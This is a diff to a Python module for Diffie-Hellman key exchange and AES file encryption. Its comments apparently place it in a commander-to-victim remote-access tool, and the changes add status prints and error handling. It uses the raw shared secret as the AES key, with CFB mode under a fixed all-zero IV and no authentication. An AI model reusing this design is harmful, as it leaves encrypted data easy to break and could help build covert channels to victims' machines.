@@ -1,6 +1,6 @@
 import socket
-from cryptography.hazmat.primitives import serialization, hashes
-from cryptography.hazmat.primitives.asymmetric import dh, utils
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import dh
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives.asymmetric.dh import DHPublicKey, DHPrivateKey
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
@@ -8,13 +8,14 @@ from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 
 def generate_keys():
     """
-    Generates private and public keys for a
-    Diffie-Hellman Key Exchange.
+    Generates private and public keys for a Diffie-Hellman
+    Key Exchange.
 
     @return private_key, public_key
-            DHPrivateKey and DHPublicKey Objects
+        DHPrivateKey and DHPublicKey Objects
     """
     # a) Set DH Parameters (must be agreed upon and same between both cmdr & victim)
+    print("[+] GENERATING KEYS: Now generating private and public keys...")
     parameters = dh.generate_parameters(generator=2, key_size=2048, backend=default_backend())
 
     # b) Generate Private Key (used for generating public key)
@@ -22,6 +23,7 @@ def generate_keys():
 
     # c) Generate Public Key (Equation = (Generator ^ private_key) % random prime number)
     public_key = private_key.public_key()
+    print("[+] OPERATION SUCCESSFUL: Private and public keys have been successfully generated!")
 
     return private_key, public_key
 
@@ -38,10 +40,14 @@ def __serialize_public_key(public_key: DHPublicKey):
     @return serialized_public_key:
         A byte representation of the commander's public key
     """
+    print("[+] SERIALIZING PUBLIC KEY: Now serializing the public key...")
+
     serialized_public_key = public_key.public_bytes(
         encoding=serialization.Encoding.PEM,
         format=serialization.PublicFormat.SubjectPublicKeyInfo
     )
+
+    print("[+] OPERATION SUCCESSFUL: The public key have been successfully serialized!")
     return serialized_public_key
 
 
@@ -57,10 +63,14 @@ def __deserialize_public_key(client_public_key_bytes: bytes):
     @return client_public_key:
         A DHPublic Key object representing client's public key
     """
+    print("[+] DESERIALIZING PUBLIC KEY: Now deserializing peer's public key...")
+
     client_public_key = serialization.load_pem_public_key(
         client_public_key_bytes,
         backend=default_backend()
     )
+
+    print("[+] OPERATION SUCCESSFUL: The peer's public key have been successfully deserialized!")
     return client_public_key
 
 
@@ -84,6 +94,7 @@ def key_exchange_initiator(client_sock: socket.socket, serialized_pub_key: bytes
     """
     try:
         # a) Send Public Key
+        print("[+] KEY EXCHANGE: Now exchanging public keys with target/victim...")
         client_sock.send(serialized_pub_key)
 
         # b) Await + Receive Status Response
@@ -91,6 +102,7 @@ def key_exchange_initiator(client_sock: socket.socket, serialized_pub_key: bytes
 
         # c) Deserialize the public key
         client_public_key = __deserialize_public_key(client_public_key_bytes)
+        print("[+] OPERATION SUCCESSFUL: Target/Victim's public key has been received!")
 
         return client_public_key
 
@@ -118,6 +130,7 @@ def key_exchange_receiver(client_sock: socket.socket, serialized_pub_key: bytes)
     """
     try:
         # a) Wait and Receive Public Key (in Serialized (Byte) Form)
+        print("[+] KEY EXCHANGE: Now exchanging public keys with target/victim...")
         client_public_key_bytes = client_sock.recv(1024)
 
         # b) Send Serialized Public Key
@@ -125,6 +138,7 @@ def key_exchange_receiver(client_sock: socket.socket, serialized_pub_key: bytes)
 
         # b) Deserialize the public key
         client_public_key = __deserialize_public_key(client_public_key_bytes)
+        print("[+] OPERATION SUCCESSFUL: Target/Victim's public key has been received!")
 
         return client_public_key
 
@@ -146,7 +160,10 @@ def generate_shared_secret(private_key: DHPrivateKey, client_public_key: DHPubli
     @return: Shared Secret
         A shared secret key (in bytes)
     """
-    return private_key.exchange(client_public_key)
+    try:
+        return private_key.exchange(client_public_key)
+    except Exception as e:
+        print("[+] DF SECRET GENERATION UNSUCCESSFUL: An error occurred during secret generation: {}".format(e))
 
 
 def encrypt(file_path: str, shared_key: bytes):
@@ -158,13 +175,14 @@ def encrypt(file_path: str, shared_key: bytes):
         A string representing the path of the file
 
     @param shared_key:
-        A byte representation of the shared key
+        A byte representation of the shared key (secret)
         (after DH key exchange)
 
     @return encrypted_data:
         A byte representation of the encrypted data
     """
     try:
+        print("[+] ENCRYPTING: Now encrypting the following file: {}".format(file_path))
         with open(file_path, 'rb') as file:
             file_content = file.read()
 
@@ -172,6 +190,7 @@ def encrypt(file_path: str, shared_key: bytes):
         encryptor = cipher.encryptor()
         encrypted_data = encryptor.update(file_content) + encryptor.finalize()
 
+        print("[+] OPERATION SUCCESSFUL: The data has been successfully encrypted!")
         return encrypted_data
 
     except Exception as e:
@@ -195,10 +214,13 @@ def decrypt(encrypted_data: bytes, shared_key: bytes):
         A byte representation of the encrypted data
     """
     try:
+        print("[+] DECRYPTING: Now decrypting data...")
+
         cipher = Cipher(algorithms.AES(shared_key), modes.CFB(b'\0' * 16), backend=default_backend())
         decryptor = cipher.decryptor()
         decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
 
+        print("[+] OPERATION SUCCESSFUL: The data has been successfully decrypted!")
         return decrypted_data
 
     except Exception as e:
